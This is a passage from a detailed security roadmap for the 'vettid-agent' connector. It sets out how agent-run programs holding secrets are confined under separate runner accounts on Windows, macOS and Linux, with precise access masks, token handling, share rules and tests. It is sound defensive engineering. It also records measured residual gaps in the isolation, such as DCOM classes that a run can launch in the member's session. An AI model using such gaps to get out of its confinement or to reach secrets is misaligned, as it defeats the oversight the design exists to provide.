service's own), so there is no per-run window station. Each run gets its own **desktop in the service's window station**. The runner's entry on that window station is **0x20060** (READ_CONTROL, WINSTA_ACCESSGLOBALATOMS, WINSTA_EXITWINDOWS), the measured minimum (0x37F, 0x2003A and 0x2005A fail), removed after the run; it is never 0xF037F, which would give WRITE_DAC and WRITE_OWNER on the shared station. The job's UI limits above stop clipboard, atom and handle sharing. The per-run desktop's access list is SYSTEM, the service's SID, and that runner's SID, with the runner's entry exactly 0x83 (DESKTOP_READOBJECTS, DESKTOP_CREATEWINDOW and DESKTOP_WRITEOBJECTS; measured by vettid/vettid-agent#60 at 380958b as the narrowest that lets user32 and ole32 initialize: without READOBJECTS or WRITEOBJECTS user32 fails, and without CREATEWINDOW ole32 is refused; no standard right is needed, and HOOKCONTROL, JOURNALRECORD, JOURNALPLAYBACK, ENUMERATE, CREATEMENU and SWITCHDESKTOP are never granted). The desktop is closed after the run, and the connector creates no windows on the shared station. `lpDesktop` is never null: a null desktop is documented to add the run's logon SID to the connector's desktop access list (documented, not measured). Window messages between processes on the run's desktop are untried (low risk: a detached program has no peer window in its job, and other desktops are out of reach). The launcher's token has INTERACTIVE enabled, LOCAL absent and BATCH absent (measured, vettid/vettid-agent#57); the program's carries INTERACTIVE as deny-only. **Said plainly:** anything whose access list grants Interactive users applies to the launcher, not to the program; the deny-only entry closes Windows' default DCOM launch for "Interactive User" servers (a cross-session path to the member's session) and anything else granted to Interactive users (no VettID access list uses Interactive users to mean the member). **It does not close every such server (measured):** a class with the machine's default launch permission is refused (0x80070005), but a class whose launch permission grants Authenticated Users, Everyone or Users passes the launch check (0x80080005, measured); treat it as launchable, as the Interactive User, in the member's session. The program can read the launcher's token groups through TOKEN_QUERY (inferred from the lock's grant, not measured), which is information only. A console or `runas` session as a runner (a leaked password) reaches what any standard local account reaches, the pairing's shares, and the secrets and processes of runs in progress for that account; it does not reach the connector's keys, and keeping the runner's processes alive keeps the slot out of use (it fails secure). Denying network logon blocks loopback NTLM as the runner (`\\localhost` shares, WMI over the network). The logon audit is documented to show type 2 logons for runs (not measured). The profile is never loaded, and `USERPROFILE`, `APPDATA`, `LOCALAPPDATA`, `TEMP` and `TMP` are fresh folders of that run, removed after it. The run's `work/`, `tmp/` and `secret/` are under the service's state folder, with an access list for that run's runner only. The `--run-path` check is the full rule of §4.9 (the owner of each folder, the ACL rights of the 0.1.15 check at each level, inherit-only ACEs not counted, any SID other than Administrators, SYSTEM and TrustedInstaller, no exemption for the service's SID). After a run ends a slot is not used again until every process whose token has the runner's SID is gone; then its scheduled tasks, Run keys and files in `C:\Users\Public` are removed; a slot whose cleanup cannot be confirmed stays out of use and `status` says so. A service whose runner account turns out to be the member's or an administrator's refuses runs and proxies, and `status` says why (the connector half is A3.10b's; note §8). The tool itself and its limits are A3.8b **Every program, pinned or not, must sit in an administrator-only folder** (owner a, GC #15787), each folder up its path checked as the `--run-path` rule does; a pin no longer stands in for it in this mode | Windows tests (the note's §10 list): the member's account cannot open a run's process or its secret file; a run cannot read the connector's state or open its process; a run cannot read the other slot's secret; a daemon forked by one run is gone before the next run starts; a `--run-path` in `%APPDATA%\npm` is refused and one in an administrator-only folder is accepted; a program that asks Windows for its known folders is recorded as unsupported or supported; a run's folders and the runner's profile are empty at the start of each run; the runner cannot log on remotely (RDP or network) and can log on at the console, and with interactive logon also denied a run is refused (error 1385); the runner's effective rights read back (console interactive logon granted, the two denies in place, no batch right; measured: a run starts without the batch right, console denied gives 1385, must-change gives 1907, seclogon Disabled gives 1058); a run started through `CreateProcessWithLogonW` from the service reads back as exactly the runner, with and without the profile, and closing the job kills it; with `seclogon` stopped and set to Manual a run still starts, and with it Disabled, or with an access list that refuses the service account, a run is refused with the §11 text; `lpDesktop` is never null and the connector's desktop access list gains no run logon SID; each run has its own desktop in the service's window station, with an entry for the runner on that station of 0x20060 (never 0xF037F) that is removed after the run (a window station cannot be created by the connector, measured); a user32-loading program runs on the per-run desktop, with and without the job; with the UI limits CreateDesktop is denied and global atoms are separate (measured), and a run whose limits cannot be set is refused; a run without its job is refused; the launcher locks its token and process before the program starts, and the program's every open of the launcher, even after it has exited and the service has closed its handles, is refused (measured; the lock is required); the job holds only the program when it is resumed, and the service resumes it only after the image, `GetProcessIdOfThread` and `IsProcessInJob` checks; no conhost exists while the program runs; git, node, npm (through `cmd.exe`), ssh and python run as the program; INTERACTIVE-only and machine-default classes refused (0x80070005); a class granting Authenticated Users recorded as passing the launch check (0x80080005); a runner account made the member's or an administrator's refuses runs and proxies, with `status` saying why; a pinned program in a folder the member's account can change (for example under `C:\Users\Public`) is refused with the §11 text, and so is one whose parent folder the member can change; a member-owned folder whose ACL is otherwise administrator-only is refused (the owner rule); the same file moved to an administrator-only folder and approved runs; the administrator-only folder in the accepted case is made the documented way (created elevated, then its owner set to Administrators with `icacls … /setowner`), and one left owned by the elevated member is refused (0.1.17, fix round) The runner names are the hash forms; the files-and-folders work of A3.10d and A5.5a is separate. (0.1.19, the lead's calls, fix round) The launcher's token reads back INTERACTIVE enabled, LOCAL absent and BATCH absent (measured); the program's token holds only `SeChangeNotifyPrivilege` with INTERACTIVE deny-only; a run cannot activate a RunAs-Interactive-User COM server; the launcher is started with `dwLogonFlags` 0 (a test refuses `LOGON_NETCREDENTIALS_ONLY`) and `CREATE_NO_WINDOW`, suspended, in the job with breakaway refused and the UI limits set; the program's image is checked by the service (its own read decides) and by the launcher (a pre-check) before the service resumes it, and a swapped file is refused; the read-only `AccessCheck` uses the program's token; **an inheritable sentinel handle open while the other slot starts is inherited by neither the launcher nor the program**; the runner's lockout (a run answered with the sign-in text, `status` says locked); the launcher builds its restricted token before it locks its own (a run with the lock first fails the build and is refused); after the resume the program can open no process or token of the runner with INTERACTIVE enabled, the launcher's and its conhost's ids included (the launcher is a GUI-subsystem executable with no conhost, measured by vettid/vettid-agent#60); the report pipe opens for the service and that runner only, and a forged or wrong report (ids of another process, a thread of another process, a process outside the job, a swapped image) is refused; each failure refuses the run with the §11 text naming the step, closes the job, and removes the station entry and the desktop, and the slot is cleaned up: the lock failing, the default access list failing, the thread's access list failing, the restricted token failing, `CreateProcessAsUser` failing, the launcher exiting without a report, an id failing `GetProcessIdOfThread`, an id failing `IsProcessInJob`, the image check failing, the job not coming down to exactly the program within 5 s, `ResumeThread` returning a count other than 1, and a timeout at each wait; each setup step failing (the desktop, the station entry, the report pipe's creation, a report-pipe client that is not the launcher, the output pipes, the job, its assignment, its UI limits) refuses the run with the same text naming the step and removes what was made; a failed removal of the 0x20060 station entry or of the desktop after a run leaves the slot out of use and `status` names it; the program is never started when the lock or either access list failed; the per-run desktop's access list holds only SYSTEM, the service and that runner, the desktop is closed after the run, and no window is created on the shared station; the program's default access list is read back; each errno of the sign-in text gives its reason. (0.1.17, the lead's calls, last round) **For a run with a member-folder `cwd`, the launcher opens and holds the folder as the runner** (§4.9): a directory handle without `FILE_SHARE_DELETE`, the final path from `GetFinalPathNameByHandle` reported to the service, and the process started in the held folder only when the service resumes it; it also makes the read-only access check (`AccessCheck` on the program's token for the write and delete rights of §4.9) and reports it. The service never opens a member folder. Tests: a folder swapped for a link between the check and the start does not run (the held handle prevents the rename; a link in the path is refused); a path outside the approved entry by case, short name or junction is refused; the service's own account has no access to the share and no run needs it; `cwd` under `C:\` inheriting Authenticated Users: Modify is refused for a read-only entry. (0.1.17, the lead's call) **The launcher** is the runner-side process the service starts with `CreateProcessWithLogonW` (stage (a) above; it starts the program with `CreateProcessAsUser` on its own restricted token, stage (c)); it sits in the administrator-only folder with the program files. On Windows it refuses a `cwd` with a reparse point anywhere in the path as given (each element opened with `FILE_FLAG_OPEN_REPARSE_POINT`) or whose final path from the handle differs from the one given beyond case and separators, and starts the process with the final path from the handle (§4.9); the test "a link in the path is refused" covers both systems. |
| A3.10d | **Files handed in and out, Windows** (0.1.17, AG14, Q9 a; card #15816; note §6 "Handing files in and out"; VAULT-MESSAGING 0.93.0 §10.11 "Files handed in and out"; after A3.10c and AV12). `leash.run_with_secret` takes `inputs` and `output`. **It needs no `share`:** the stub, which runs as the member, reads each input and the service writes the copies, as §4.9 "Files in and out" says (note §6: nothing is shared by access list). The stub reads each input (at most 16 files, 16 MiB each, 64 MiB in all, paths 16 KiB in all) and sends the bytes over the channel; **the service enforces the caps and each approved `size` on the bytes it receives** (an input whose real size differs stops the run before it starts) and writes them read-only into the run's `work/in/`. After the run, and only after every process of the runner is gone, the service reads only the named files of `work/out/` on opened handles (no-follow at each element, `FILE_FLAG_OPEN_REPARSE_POINT` for directories; regular files owned by the slot's runner, link count 1, never a reparse point or link; flat names with no `..`, `:` or reserved Windows names); past a cap the rest is dropped and the answer says so. **The binding is checked again at copy-back, against the current binding:** a narrowed binding means nothing is copied back. Each is redacted as standard output is (§4.9), over its bytes, before it leaves the service, and the answer lists the files redacted. The stub writes into the output folder, each file new (`CREATE_NEW`, never overwriting; a numbered suffix if the name is taken), never through a link in the destination. The connector sets `VETTID_IN` and `VETTID_OUT`. The input and output paths are checked against the binding the vault approved (the vault refuses a request they do not fit, `cwd_not_allowed`, before it reaches the connector); a connector whose catalog entry for the item has no `folders` refuses `inputs` and `output` with `vault_too_old`. A run with files only, no `cwd`, is always referred to the phone, whatever the item's "ask each time" setting (owner decision a, GC #15856); letting the item's own setting decide such runs later needs no wire change | Tests (Windows, test accounts): an input over a cap, a 17th file, a name with a `..`, `:`, a reserved name or a trailing dot refused; an output that is a link, a junction, a hard link to the state file or owned by another account refused; an output name taken gets a numbered suffix and nothing is overwritten; an output holding the secret is redacted and listed; an input or output folder outside the binding, or an output folder in a read-only entry, is `cwd_not_allowed` with the files text, and no share is needed or consulted; an input whose size differs from its approved `size` stops the run before it starts; an output file swapped for a link after the run's last process ended, or a binding narrowed between the approval and the copy-back, copies nothing; `VETTID_IN` and `VETTID_OUT` hold the two paths and are refused in a request's `env`; the inputs' total path bytes over 16 KiB refused; a `\` in a path refused on POSIX (A5.6); the run's own `work/in/` is read-only to the program; golden answers show `outputs` with names, sizes and `redacted`. Never run against the implementing agent's own folders. (0.1.17, last round) The service never opens a member folder: the copies go through the stub (the member) for the input and output folders, and the run's own `work/in` and `work/out` are the service's. The copy-back recheck reads the current binding from a catalog read in the current vault session (§4.9). The catalog rule of §4.9 gates `inputs` and `output` (`vault_too_old` for an item whose entry has no `folders`), a `cwd_not_allowed` for `work/` is retried once without `cwd`, and `reason` is one of `size`, `link`, `owner`, `binding`, `missing`. Tests: no `folders` in the entry gives `vault_too_old` and no request; a catalog read before a reconnect is not trusted after it; the retry runs once; each `reason` appears. |
| A3.10e | **Hardened profiles and pinned control files, Windows** (0.1.17, AG14, Q8 a; card #15815; note §6 "Narrowing the steering through shared folders"; after A3.10c and AV12; its wire needs a VAULT-MESSAGING change not yet specified). Profiles for git, ssh and curl first, then the cloud and file tools (`aws`, `gcloud`, `az`, `rclone`): allowlisted subcommands and options, overrides placed before the agent's arguments, the connector's own credential helper, refused configuration steering, an endpoint allowlist, and the SHA-256 pins of the control files (git's `config` as a normalized projection, includes, `.gitmodules`, attributes, hooks). A program that runs the folder's code by design (npm scripts, `make`, `build.rs`) is always referred in a shared folder. Until it ships, no program is exempt from referral in a member folder (VAULT-MESSAGING 0.93.0) | To be written with the card; the note's §6 lists the cases |

### A4 — Delegable owner types (v1.1, after the owner confirms AG5)

*Status: not started.*

| PR | Contents | Acceptance |
|---|---|---|
| A4.1 | `vettid.connections.*`, `vettid.profile.get` | Dev stack: grants with and without `connections` restrictions; a request outside them refused |
| A4.2 | `vettid.messages.*` | Dev stack with the dev stack's peer: `message.send` under an `ask` grant is referred and, once approved, reaches the peer; a message with only an attachment is invisible; `message.send` with an attachment is refused |
| A4.3 | `vettid.actions.*` | Dev stack: `action.invoke` under a grant; the connector's `action.respond{approve: true}` refused (§6.8) |

### A5 — Platforms, packaging, signing

*Status: A5.1 #29, #31 and the scripts of A5.2 and A5.3 #37 are merged. (0.1.16) A5.4 to A5.6 (the installers of the separate-account mode, AG14) are not built. Whether the owner has run `scripts/sign-release` to publish a signed release was not established.*

| PR | Contents | Acceptance |
|---|---|---|
| A5.1 | Reproducible release build script and workflow (unsigned artifacts, `SHA256SUMS`), and a `verify-reproducible` script | Two clean builds produce identical hashes on Linux amd64 and arm64 |
| A5.2 | Signing in one command for the owner (owner decision, 2026-10-18): signed `v*` tags, refused by the release workflow unless GitHub verifies them; `scripts/sign-release` on the owner's machine checks the tag, rebuilds the release and compares it with the draft, signs `SHA256SUMS` (which names the tag and commit) with `ssh-keygen -Y sign -n vettid-agent-release` and the release key on the owner's YubiKey, verifies the signature against the repository's `allowed_signers`, uploads and publishes after confirmation; `scripts/verify-release` and instructions for users; a CI check of the signature on publish; the public key in the repository and on vettid.org | The owner signs a release candidate with one command; a published release without a valid signature fails the check; the verification instructions succeed on a clean machine |
| A5.3 | macOS: `vettid-agent.app` built, signed with the owner's Developer ID (individual account), notarized and stapled by `scripts/sign-release` on the owner's Mac, added to `SHA256SUMS` (not reproducible across machines; vouched for by the Developer ID and the release key). Windows Authenticode **waits until the business entity exists** (owner, 2026-10-18) | Gatekeeper accepts the notarized app; the A1.5 round trip passes on the owner's Mac. Later: a signed Windows binary runs under Smart App Control in enforcement mode (#5 closed) |
| A5.4 | **macOS installer for the separate-account mode** (0.1.11; AGENT-SEPARATE-ACCOUNT §3, the owner's Q4 c). Three parts, in order. **Who runs what:** the implementing agent builds, installs and tests parts 1–3 end to end on a test Mac with a free **Apple Development** certificate (it has a team ID, so access lists behave as in a release) or ad hoc signing, an unnotarized package and `sign-release --skip-notarize`. Only notarization, stapling and the Developer ID rerun of part 1 wait for the owner, on the owner's Mac. No owner key or Apple credential is ever in CI or the repository (AG4). **1. A keychain check first.** The item is created through the Security framework by the signed, elevated `pair` (not the `security` tool, whose items get the `apple-tool:` partition), with an access list naming the connector by its code-signing requirement, and its partition list is recorded. The daemon, under its hidden non-root user, reads it with user interaction off (`SecKeychainSetUserInteractionAllowed(false)`), so a mismatch fails instead of waiting on a prompt. The check tests that the daemon reads it, also after a reboot with no user logged in; that the daemon can neither change nor delete it; that the elevated `forget` deletes it; that a re-signed upgrade reads it without a prompt; that a binary with another signature is refused; and whether the item travels with Migration Assistant or Time Machine (why AG3 rejected file-based keychains). The upgrade and other-signature cases are run again with the owner's Developer ID build before the first release. The System keychain uses access lists, not access groups, so `keychain-access-groups` is not involved. If any step fails, the protector question (AGENT-SEPARATE-ACCOUNT Q4) goes back to the owner before parts 2 and 3. **A key-handling change, said plainly** (a security path, §9 rule 6): with root creating the item at `pair`, the elevated command generates the data key and writes it, where today the connector does (§4.2, a new data key at each pairing). Any later rotation of the data key also goes through an elevated command. It gets its own independent review before code. **2. Signing**: every Mach-O signed with the Developer ID Application certificate (Apple Development in testing), the hardened runtime and a timestamp. The connector is the bundle's `CFBundleExecutable` in `vettid-agent.app`, the only Mach-O that gets the embedded provisioning profile, and so the only one with a restricted entitlement (`keychain-access-groups`, for the same-account mode, §4.2). The stub is a separate executable in the bundle's `Contents/Helpers/` with no restricted entitlement. The run helper is a bare executable with no entitlements, in `/Library/PrivilegedHelperTools/` (not `/usr/local/libexec`, which Homebrew may give to the user). The run helper is never given Full Disk Access: macOS holds the responsible process accountable, so that grant would cover every run. **3. A signed, notarized installer package** (`vettid-agent-<version>.pkg`), signed with the owner's **Developer ID Installer** certificate, notarized (which covers every Mach-O inside) and stapled. Like A5.3, it is not reproducible across machines, vouched for by the Developer ID and the release key (AG4). Its payload is root:wheel, with nothing group- or world-writable (`pkgbuild --ownership recommended`, checked). It places only the shared parts: the app in `/Library/Application Support/VettID/agent/`, the helper and its launchd job (root:wheel 0644, with `AssociatedBundleIdentifiers` so it shows under VettID in Login Items), and the uninstaller. `postinstall` runs as root and only loads the helper's job; on an upgrade it reloads that job (`bootout`, then `bootstrap`) and restarts the pairings' daemons, whose state stays. Any Mach-O in the package's scripts is signed too. Plists rather than `SMAppService.daemon`, because the per-pairing plists can't live inside the signed bundle. **Per pairing, `vettid-agent install` (as root) does the rest**: the connector user `_vettid<n>` and the runner users `_vettidrun<n>a` and `b` (`dscl`: uids below 500 with a collision check, `Password '*'`, `PrimaryGroupID`, `RealName`, `IsHidden`, shell `/usr/bin/false`, home `/var/empty`; not `sysadminctl`, whose secure-token and home-folder side effects are unwanted); the member-only group for the socket; `<n>/` and its run root, created fresh with `mkdir` (anything already there is refused, never reused); the daemon's and socket's plists (root:wheel 0644, `launchctl bootstrap system`), with `AssociatedBundleIdentifiers`, and `status` reports when the member has switched them off. The socket's parent is a persistent root-owned folder, `/Library/Application Support/VettID/agent/run/` (0755), since launchd's `Sockets` doesn't create parents and `/var/run` is cleared at boot. A test checks that the member's stub reaches the socket right after `install` adds the member to the group, without logging out. **The uninstaller** runs as root. It `bootout`s every job, ends their processes, and deletes the users and the group and the System keychain items. It removes the state and the run root without following links (`fts` with `FTS_PHYSICAL`, or `O_NOFOLLOW` and `fstat` at each step): those trees belong to `_vettid<n>` and the runners, and a planted symbolic or hard link must not make root remove or change anything outside them. It does not overwrite files (on APFS and an SSD that achieves nothing, and the keys are in the keychain). Then it runs `pkgutil --forget`. A pairing still live is unlinked first, or the uninstaller says plainly that it was not, and that the phone still lists it. `scripts/sign-release` gains the package, in this order: sign each Mach-O and the app, notarize the app and staple it; then build the `.pkg` around the stapled app, sign it, notarize it and staple it; then add the package to `SHA256SUMS` and its release-key signature. Stapling the app after the package is built would leave the copy inside unstapled. Note: member folders under `~/Documents` or `~/Desktop` (Q1 a) are protected by macOS privacy controls (TCC), so a runner started by the daemon is refused there unless access is granted; this is a limit of macOS runs, recorded for A3.8 on macOS. | The keychain check passes, or its failure is reported to the owner. For each Mach-O: `codesign --verify --strict`, and `codesign -dvv` showing the signing chain, `flags=runtime` and a timestamp. `codesign -d --entitlements -` shows, for the connector, the entitlements its profile authorizes and no others, and none restricted for the stub and the helper. For the package: `pkgutil --check-signature`, a payload with nothing group- or world-writable, and `spctl --assess --type install -vv` reporting `source=Notarized Developer ID`. `stapler validate` for the `.pkg`, and for the app as installed from it (bare executables can't be stapled). `spctl --assess --type execute -vv` on the installed app reports `source=Notarized Developer ID`. The package installs, `install` and the uninstaller run, a planted link in the state tree is not followed, and nothing is left behind, on a Mac other than the build Mac (checked and listed in the README). A dry run of `sign-release` on a test tag produces all of it. |
| A5.5 | **Windows installer and uninstaller for the separate-account mode** (0.1.16, AG14; card #15759; note §3, §5; moved forward from A5; after A3.10c). `vettid-agent install --name <n> --member <user>` as an administrator: the member named explicitly and confirmed (under UAC the person who ran it is the administrator), names unique on the computer (a second install of a name is refused), the two runner users (`vtdr-<8 hex>-1` and `-2`; the hash and collision rule of A3.10a (8)) and their rights (0.1.19, the owner's decision, GC #15936: `SeInteractiveLogonRight` granted explicitly and the effective right checked, RDP and network logon denied and re-checked by the elevated `status` and at install and upgrade only (the service cannot read the rights), no batch right, password never expires, a random password that meets the local complexity policy (`install` checks it), hidden from the sign-in screen; A3.10c), the service (vettid/vettid-agent#53) as `NT SERVICE\vettid-agent-<n>` with the required-privileges list set to exactly `SeChangeNotifyPrivilege` (`SERVICE_CONFIG_REQUIRED_PRIVILEGES_INFO`), no LSA grant to the service SID, and `SidType` unrestricted (A3.10b), with a quoted `ImagePath` under `Program Files` (every folder up the path checked as the `--run-path` rule does), the configuration file, the pipe's name. `pair` and `forget` run elevated, from the administrator-only path, through the Start menu's elevated shortcut (`share` is not built: it is card #15814, A5.5a, and until then runs use `work/` only); the README gives that and says to start them only so, and says plainly that UAC set to "never notify" gives no protection from this. The installer grants the member `SERVICE_START` and `SERVICE_QUERY_STATUS` on that service only, never `SERVICE_CHANGE_CONFIG` or `SERVICE_STOP`, so the agent cannot repoint or reconfigure it (the lead's call). The uninstaller stops and removes the service, the runner accounts and their processes, the runners' logon-right entries and the state folder after overwriting the state file. The virtual account's profile stays "in use" for over a minute after the service is deleted (measured), so the uninstaller retries that removal later or says that it is left and will go. The installer does not change `seclogon`; it warns when it finds `seclogon` Disabled, or not startable by the service's account, and says what to check. An upgrade is `vettid-agent install --upgrade --name <n>` (a second plain install of a name is refused): it replaces the program files and restarts the service, the state staying; it is what the "Versions differ" text of §11 points to. The README says which tools a runner can use and how to install npm tools for runs in an administrator-only folder (GC #15751, #15763); a member's own tool installs, SSH agent and Git Credential Manager are not usable by a run. Unsigned build until Authenticode exists (A5.3). A3.8b and A3.9 start only after this row (owner edits #1002, #1003 applied 2026-11-21) | Windows tests (the note's §10 list): install and uninstall leave nothing behind (what is left, if anything, is listed in the README); a second install of a name is refused; a stub run by a user other than the member cannot use the pipe; `pair` run without elevation is refused; `pair` from a non-elevated member process speaking the protocol directly is refused by the service, and an elevated `pair` from an administrator account that is not the member works; an elevated `pair` against a squatted pipe is refused by the client; the member can start and query the service but cannot stop it, change its configuration or repoint its `ImagePath` (the rights above); a second Windows user's stub is refused; Defender and SmartScreen do not block the unsigned build, or the result is reported (0.1.17, fix round) The accounts have the hash names; a collision is refused; a reserved pairing name is refused; `%ProgramData%\VettID\agent` is created administrator-owned and not member-writable. (0.1.17, the lead's call, from the agent#52 blind pair) The installer refuses when UAC is off (`EnableLUA=0`) or when the member is the built-in Administrator (RID 500), and refuses when the member is in the Administrators group (owner decision a, GC #15862: the mode needs a standard member account), saying to make a standard account for daily use and the agent; the README says so (§11). **The service repeats the `EnableLUA` and RID 500 check whenever it judges a client elevated** (the lead's call, last round) and refuses `pair`, `forget` and `share` if either holds. **The service also refuses tools to an administrator member** (the lead's call): when the member's token holds the Administrators SID, enabled or deny-only, the admission gives no tools, and the stub answers every tool with `member_is_admin`; so a member added to Administrators after install is caught at their next sign-in (a token carries the groups from logon; until then it has no administrator rights). Other privileged groups (for example Backup Operators) are not checked; the README says the member should be a standard user in no such group. Tests: each refusal, at install and at the service (UAC off, RID 500, a member in Administrators at install, a member added to Administrators after install). (0.1.19, GC #15936) After install the service's required-privileges list is exactly `SeChangeNotifyPrivilege` and the service SID holds no right through LSA; `SidType` is unrestricted; the service starts and its token holds that one privilege only; an install that leaves the default list, or adds a grant, is caught by the service's self-check (it refuses to run and `status` says why); the runners' effective rights read back (`SeInteractiveLogonRight` held, the two denies in place, no batch right), "password never expires" is set, the passwords meet the local complexity policy and `install` refuses when it cannot make one, and the runners are hidden from the sign-in screen; a runner locked by guessing is reported by `status`; `install` with `seclogon` Disabled, or not startable by the service account, warns and does not change it; after uninstall the runners and their rights are gone and the service SID holds no right through LSA; the virtual account's profile, still in use after the service is deleted, is removed by the retry or reported. |
| A5.5a | **`share` for the separate-account mode, Windows** (0.1.17, AG14, Q1 a, Q7 a; card #15814; note §5, §6; after A5.5). `vettid-agent share --name <n> <folder> [--write]` and `share --remove`, only from an elevated administrator's token (the service checks it, as for `pair`; the stub's `share` from the member's own process is refused). The administrator names the folder, never the agent. It gives the pairing's two runner accounts an access-list entry, read-only unless `--write` (read-only is offered first), and an inheritable entry giving the member full control of what a runner writes there; never `Everyone` or `Users`. **The entries are for the two runner accounts only**; the service's own account gets none, and never opens the folder (the launcher does, as the runner, §4.9). **Without `--write`, `share` also adds an explicit, inheritable deny entry for the two runner SIDs** (the lead's call) for `FILE_ADD_FILE`, `FILE_ADD_SUBDIRECTORY`, `FILE_WRITE_ATTRIBUTES`, `FILE_WRITE_EA`, `FILE_DELETE_CHILD`, `DELETE`, `WRITE_DAC` and `WRITE_OWNER`, so write inherited from a parent (for example Authenticated Users: Modify under `C:\`) does not reach them; **A read-only `share` also adds an inheritable `OWNER RIGHTS` entry granting read and execute only** (the lead's call), so a runner that owns files from an earlier `--write` share cannot rewrite their access lists. **`share` warns when another access entry already gives the runners write** and says which. On Linux, switching a share to read-only `chown`s every file owned by the runners in the folder to the member; and, where an ACL deny entry is not available, `share` refuses a folder whose group or other write bits would reach the runners and says why. A folder on a redirected network path, a link or reparse point, a drive root, or one that holds the connector's own folders is refused. `status` lists the shares and `uninstall` removes them. **`share` is for a run's working folder (`cwd`) only**; files in and out need no share (A3.10d). A working folder is usable by an item only when the member has also listed it in the item's `folders` on the phone (AA9); neither alone is enough, and the vault cannot tell what is shared (VAULT-MESSAGING 0.93.0 §10.11). **"Read only" is enforced for the folder a run starts in** (owner decision a, GC #15855): the service refuses a run whose `cwd` matches an entry with `write: false` while this pairing's share grants that folder write, with the NEW text of §11; the member makes the share read-only (`share --name <n> <folder>` without `--write`) or turns the entry's `write` on. **Said plainly:** a run can reach every folder shared with that computer's pairing; an item's list decides where a run may start and where files are copied, not everything a program run there can read; per-item runner accounts would close that and are not the design (Q3 a) | Windows tests (test accounts): a share from the member's normal token refused; the entries are for the two runners only; read-only blocks a write by a runner; a runner's new file is owned or fully controllable by the member; a network, link, root or state folder refused; `status` lists, uninstall removes; a working folder shared and not in the binding, and the reverse, are each `cwd_not_allowed` with the working-folder text; a share is not consulted for inputs or outputs; a run whose `cwd` matches an entry with `write: false` while the share grants write is refused with the §11 text naming the folder and both ways out, and runs once the share is read-only or the entry's `write` is on; a share that grants write to a folder no entry lists is `cwd_not_allowed` as before. (0.1.17, last round) A read-only share adds the deny entry and the `OWNER RIGHTS` entry (read and execute only); with `--write` a run creates a file, the share is switched to read-only, and a run cannot change the file or its ACL; on Linux the same switch `chown`s the file to the member (tested); a folder under `C:\` inheriting Authenticated Users: Modify is refused for a read-only entry until `share` (read-only) adds the deny, then runs; a warning when another entry gives the runners write; on Linux a folder with group or other write bits is refused with the reason; the service's account has no entry. |
| A5.6 | **Linux service, runners and installer for the separate-account mode** (0.1.16, AG14; card #15760; note §2, §3, §4, §5; after A5.5; moved forward from A5; its Linux design, reviewed before the run helper's and the key sealing's code: AGENT-LINUX-RUNTIME, draft). Per pairing, `vettid-agent install --name <n> --member <user>` as root: the member named and confirmed, names unique on the computer (a second install of a name is refused; an upgrade is `vettid-agent install --upgrade --name <n>`); system users `vettid-c-<8 hex>` and `vettid-r-<8 hex>-1`, `-2` (the hash of A3.10a (8)) (fixed, not `DynamicUser=`); a systemd system service on demand with socket activation (`ListenStream=/run/vettid-agent/<n>.sock`, `SocketUser=` the connector's account, `SocketGroup=` a group holding only the member, `SocketMode=0660`); the channel's Unix-socket end (the service compares the peer's uid from `SO_PEERCRED` with the recorded one, never the pid; the stub and the elevated `pair`, `forget` and `status` each `lstat` the socket, refuse a link and check the owner and the root-owned parent, accepting root or the connector's account as the server; no path or configuration from the stub, A3.10a); state in `/var/lib/vettid-agent/<n>/`, 0700; an administrator-only configuration file (`--run-path`, `--run-env`), with the `--run-path` check against the member and every non-administrator (§4.9); program files in `/usr/local/libexec` (root-owned), every folder up the path checked; keys by `LoadCredentialEncrypted=` sealed to the TPM 2.0, the data key generated by the elevated `pair` (§4.2; a key-handling change with its own independent review before code, §9 rule 6; without a TPM 2.0, owner c on GC #15786: `install` stops unless `--no-tpm` is named, then systemd's host key (root-readable, not hardware-bound), said in `install`'s output and in `status`; `--no-tpm` on a machine with a TPM 2.0 is refused; tested both ways); **every program, pinned or not, must sit in an administrator-only folder** (owner a, GC #15787), each folder up its path checked as the `--run-path` rule does (POSIX: no group or other write bit, owner root); the version exchange of A3.10a; logs to the journal under the pairing's name with only the name, the tool, the outcome code and a resolved program path; `Restart=on-failure` at most a few times a minute; the access session unknown after a resume until `vault.status` answers; the service stops by the stop rule of §4.9. A service whose connector **or a runner** account is the member's or an administrator's refuses runs and proxies and `status` says why. **Elevated commands:** `pair` and `forget` run as `/usr/bin/sudo /usr/local/libexec/vettid-agent/vettid-agent <command>`, both by absolute path, and the service accepts them only from peer uid 0, and admits root or the member's group for no tool (A3.10a); `share` is not built (it comes with the Q1 cards; until then runs use `work/` only). **The run helper:** a root service on a root-owned socket only the connector's account may open (peer uid checked) that takes, over `SCM_RIGHTS`, the program's sealed copy (§4.9), the run's standard streams and the secret's descriptor, makes the run's `work/`, `tmp/` and `secret/` under a root-owned run root (0711, outside the connector's 0700 folder), owned by the slot's runner, 0700, writes the `file` secret from the descriptor, and starts the program as the runner in its own session with `no_new_privs`, supplementary groups reset and only the environment the connector built; it takes no path or argument it does not pass on, reads the runner uids from root-owned configuration, and never starts anything as root for a run (the administrator checks run `sudo` as root, AGENT-LINUX-RUNTIME §11.5, 0.1.20). Each run is its own cgroup (`Delegate=yes`), killed as a whole. **Slot cleanup:** a slot is used again only when every process of its runner is gone; then the runner's files in `/tmp`, `/var/tmp` and `/dev/shm` and its scheduled jobs (cron, `at`, systemd user timers) are removed; a slot whose cleanup cannot be confirmed stays out of use and `status` says so (the tool's text is in §11). The README says which tools a runner can use and how to install tools for all users where only an administrator can change them; a member's own installs (nvm, pyenv, cargo or rustup in the home folder) and the SSH agent are not usable by a run. The uninstaller removes the service, the users, their processes, the group and socket access and the state folder after overwriting the state file. The run helper takes its own independent review before it merges (§9 rule 6) | Linux tests: the helper starts a program only as a runner uid and never as root for a run; a run inherits only its standard streams (every other descriptor close-on-exec); a daemon forked by one run (`setsid nohup`) is gone before the next run starts; a file a run leaves in `/tmp`, `/var/tmp` or `/dev/shm` and a cron job, an `at` job or a systemd user timer it makes are gone before the next run, and a cleanup that cannot be confirmed keeps the slot out of use with `status` saying so; the socket refuses another user and a stub refuses a link or a server of another owner; `pair` from the member's normal process speaking the protocol directly is refused, and an elevated `pair` (under `sudo`) from an administrator account that is not the member works; the member's account cannot read the state, the run root or a run's secret; a second install of a name is refused and `--upgrade` keeps the state; the logs hold no value, argument, `cwd`, code, SAS or address; a connector or runner account made the member's refuses runs and proxies; a pinned program in a folder the member can change, or whose parent the member can change, is refused with the §11 text, and the same file moved to a root-owned folder and approved runs; `--no-tpm`: `install` without it stops on a machine with no TPM 2.0, with it installs with the notice and `status` shows the host key, and with it on a machine with a TPM 2.0 is refused; a root caller that is not the member gets no tool answers; install and 